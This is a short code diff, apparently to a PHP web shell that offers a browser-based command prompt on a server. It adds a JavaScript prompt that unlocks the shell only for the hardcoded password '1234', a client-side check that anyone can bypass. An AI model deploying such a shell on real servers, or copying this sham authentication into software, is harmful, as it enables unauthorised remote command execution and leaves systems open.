@@ -470,10 +470,13 @@ if (isset($_GET["feature"])) {
             };
 
             window.onload = function() {
-                eShellCmdInput = document.getElementById("shell-cmd");
-                eShellContent = document.getElementById("shell-content");
-                updateCwd();
-                eShellCmdInput.focus();
+                var password = prompt("Enter in the password");
+                if (password=="1234") {
+                    eShellCmdInput = document.getElementById("shell-cmd");
+                    eShellContent = document.getElementById("shell-content");
+                    updateCwd();
+                    eShellCmdInput.focus();
+                }
             };
         </script>
     </head>
